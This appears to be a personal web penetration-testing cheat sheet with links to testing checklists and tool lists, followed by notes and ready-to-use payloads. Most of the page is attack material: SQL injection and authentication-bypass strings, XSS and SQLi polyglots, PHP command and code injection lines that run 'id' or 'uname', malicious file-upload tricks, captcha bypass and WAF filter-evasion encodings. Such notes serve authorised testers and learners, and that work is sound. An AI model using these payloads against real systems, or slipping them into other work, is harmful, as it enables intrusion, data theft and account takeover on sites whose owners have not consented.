# pentest

http://code.google.com/p/pentest-bookmarks/wiki/BookmarksList
https://github.com/dloss/python-pentest-tools

# checklist
http://www.owasp.org/index.php/Testing_Checklist
http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
http://www.pentest-standard.org

# tools / learn
http://blackarch.org/tools.html
http://www.win.tue.nl/~aeb/linux/hh/hh.html
https://www.owasp.org/index.php/Phoenix/Tools
http://oss-security.openwall.org/wiki/tools
http://securitytools.wikidot.com/penetration-vulnerability-ids-ips

# search for known exploits

locate -i
~/Documents/kb/
~/Documents/exploits/{exploit-database,packetstorm,vulndbs}
site:seclists.org
site:cvedetails
www.intelligentexploit.com ...
metasploit modules, nmap nse
grep keyword blackarch,pentoo,kali,...

learn about technology, test on a local install

admin interfaces: https://www.whitehatsec.com/bAdmin/bAdmin.html

# reporting
http://www.securingthehuman.org/developer/swat

# testing
* heartbleed

* info disc
blah.php?foo=bar => blah.php?foo[]=bar
blah?a=1&a[]=1
blah?x[y]=1&x[y]z=2
heartbleed (ESX & ESXi are vuln)

* polyglot (http://www.slideshare.net/MathiasKarlsson2/polyglot-payloads-in-practice-by-avlidienbrunn-at-hackpra)
mysql: +or+SLEEP(10)/*'or+SLEEP(10)+or'"or+SLEEP(10)+or"*/ urlencoded: %20or%20sleep%2810%29/%2a%27or%20sleep%2810%29%20or%27%22or%20sleep%2810%29%20or%22%2a/
xss: " onclick=alert(1)//<button value=Click_Me ' onclick=alert(1)//> */ alert(1); /* 
aio: /*! SLEEP(1) /*/ onclick=alert(1)//<button value=Click_Me /*/*/ or' /*! or SLEEP(1) or /*/, onclick=alert(1)//> /*/*/'or" /*! or SLEEP(1) or /*/, onclick=alert(1)// /*/*"/** /*!/*/ // /*/*/
more at https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
using BENCHMARK instead of SLEEP: https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
more xss polyglot https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

* xss
leverage error pages/sqli errors/... (send encoded xss, response returns error page with decoded payload)

* sqli
?id=!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~  // id=%21%22%23%24%25%26%27%28%29%2A%2B%2C-.%2F%3A%3B%3C%3D%3E%3F%40%5B%5C%5D%5E_%60%7B%7C%7D%7E
' '' " "" \ \\ \' \" ... ) -- )--
%2527 %2522 ... %252527 ...
?login=%bf%27 # bypass mysql-real-escape-string (db driver and db don't talk same charset)
even and odd number of lots of '
stacked, time-based, second order
rtfm keywords/escaping
select 1 from users where login = "login" and password = "password" => 1 # sqlite
select * from users where username = 'a'+'b' and password = 'a'+'b' => returns first user whose username and password doesn't start with a numeric value (mysql:  http://vagosec.org/2013/04/mysql-implicit-type-conversion/ and other operators possible) # sqli waf evasion
select * from users where username = 0 => returns all records because column is of type varchar (every username is converted into a double, and 0=0 is true)
select 'foo'+0 = 0 => 1 (true) 
select 'a'+'666' => 666 (double value)

login=user1&password=') or 1=1 limit 0,1 --%20 # bypass auth
query: "SELECT * FROM haxorz_memberz WHERE login = '%s' AND password = MD5('%s')"
code: if (@mysql_num_rows($sql) == 1)

* sqli in order by (MySQL)
?order=book_id+DESC
?order=book_id`,`book_name
?order=IF(1,book_id,book_name)

* parameters to test
GET, POST, Cookie, User-Agent, Host, Referer, X-Forwarded-For, X-Forwarded-Host

X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 175.45.177.64 the hostname's IP (ctf)

* bypass IP whitelisting
X-Forwarded-For: 0000::1 (RoR 4.2 Web Console https://gist.github.com/joernchen/d868521352f1ccd25095)

* authentication
incomplete validation: remove last character of long password, change case, remove specials
pw hash collision / php type juggling (https://github.com/spaze/hashes)
register AdMiN to login as admin # MySQL performs a case insensitive comparison by default
register admin%20 to login as admin # MySQL ignores trailing spaces when performing string comparison
register admin++++...++++x column truncation (http://www.notsosecure.com/blog/2008/09/11/sql-column-truncation-vulnerabilities/ http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/ http://www.sektioneins.com/en/advisories/advisory-052008-wordpress-user_login-column-sql-truncation-vulnerability.html)
/activate/?activation_code= => SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1 # login w/o password as the first account
login.php?login=admin&password[]=a // strcmp($expectedpw, $_GET['password') == 0

* authentication bypass
cookie: $username|$expiry|$hmac => hmac_md5(admin1|1353464343, $key) == hmac(admin|11353464343, $key) //wordpress
bf $key //rack
type juggling in php or other (http://www.php.net/manual/en/language.types.type-juggling.php) var_dump('1abcdef' == 1); => true. Or stuff like strcmp, ==, equals etc.
var_dump("0e1234" == "0e4321"); => true (0 multiplied by anything is still 0) useful if server does: if (hmac(..) == hmac(..))

* reset forgot pw
mysql 1="1abc" => true and 0="abc" => true so request /reset?token=0 (http://phrack.org/issues/69/12.html)

* captcha
remove captcha_answer= parameter from request
leaked in src or cookie
re-submit same answer w/ same cookie
limited number of words (solve with a hash lookup table)
tesseract-ocr ou gocr ou ssocr
remove blue grid from image : Image('captcha.png').point(lambda p: p>0 and 255).save('clean.png') # blank everything that's not black
un-implode
SentryMBA

* server side include
<!--#printenv -->

* server side template injection
http://blog.portswigger.net/2015/08/server-side-template-injection.html
{{ 7*7 }}

* code injection
try commands that don't return any output or only return one word: sleep/ping/pwd/whoami
or get output through out-of-band or ip=127.0.0.1%0a`id`>/var/www/public/results.txt
try echo pi in case input is eval'd by PHP app
in PHP usort: ?order=id);}system('uname%20-a');//
in PHP assert: ?vuln=hacker'.phpinfo().' -> assert('hacker'.phpinfo().'

* language injection
${"aaaa"} => search response for "aaaa"
${99999+1} => search for 100000

* upload
change extension to .php[3-6], .phtml, .xhtml, .shtml, .stm. .shtm, ..., .html, .htm, .htt, .mht, .thtml, .svg, .xml
upload lol.php.csv
upload .htaccess to enable another allowed extension to be run by PHP
upload evil.php with Content-Type: image/jpg in case app checks the MIME type
upload evil.jpg with PHP code inside image
upload evil.png acess uploads/evil.png/x.php (see ./nginx)
upload imagetragick (im relies on the magic header so even if app checks extension you can upload a .mvg or .svg file as evil.png)

* info disc
windows -> ::$data, case insensitive .JSP

* passing scanning
parse image responses for sql errors, path/ip disclosures etc.

* dir traversal
....//

* randomness

* iis
http://srv/web/blah\..\jobMail.asp

* inter-protocol exploitation
e.g. server does not sanitize dns response from attacker's domain => xss, sqli, rce ...

# filter evasion
always be aware that filters and weird setups can alter your inputs, cap
strings, add stuff to them, replace/remove characters and so on.

windows quirks: change case, use 8.3 file/dir names, insert unsupported chars (<, : etc.) that will be automatically removed

eViL
evevilil
%65%76%69%9c
%2565%2576%2569%259c

$id = str_replace(' ', '', $id);
if (!preg_match('/^\d+$/m', $id)) { die(); }
$id = preg_replace('/^[^\d]+$/', '', $id); // won't replace "a1"
=> bypass all 3 filters with "1%0A)or(1)%23"
expl: "0%0a)union/**/select/**/null"

* whitespace
%09 %0d %0a %20 ...
add more than one of each type

* url encoding
s%65lect
s%2565lect
s%elect

* multiline regex
id=123\nPAYLOAD

* comments
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
SEL/*foo*/ECT username,password FR/*foo*/OM users // mysql only

* alternate IP encoding (https://prezi.com/fffqa6n75gbm/zeronights-2014-hunting-for-top-bounties/)
127.0.0.1
2130706433
0x7f000001
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
ping 010.010.010.010; ping 127.1; ping 0177.1; ping 0x7f.1; ping 0; man inet_aton (You can use/mix decimal/octal/hex, omit some/most octets)

http://425.510.425.510/ dotted decimal with overflow
http://2852039166/ dotless decimal
http://7147006462/ dotless decimal with overflow
http://0xA9.0XFE.0XA9.0XFE/ dotted hexadecimal
http://0xA9FEA9FE/ dotless hexadecimal
http://0x41414141A9FEA9FE/ dotless hexadecimal with overflow
more in Server Side Browsing by @agarri

* utf-7
def utf7(s): # Illegal but accepted UTF7, useful for some blacklists
  return ''.join('+%s-' % b64encode('\x00' + c).rstrip('=') for c in s)

* twahh
exec('sel' + 'ect * fro' + 'm users')

' = %27 = %c0%a7 = %e0%80%a7 = %f0%80%80%a7
" = %22 = %c0%a2 = %e0%80%a2 = %f0%80%80%a2
< = %3c = %c0%bc = %e0%80%bc = %f0%80%80%bc
; = %3b = %c0%bb = %e0%80%bb = %f0%80%80%bb
& = %26 = %c0%a6 = %e0%80%a6 = %f0%80%80%a6
\0= %00 = %c0%80 = %e0%80%80 = %f0%80%80%80
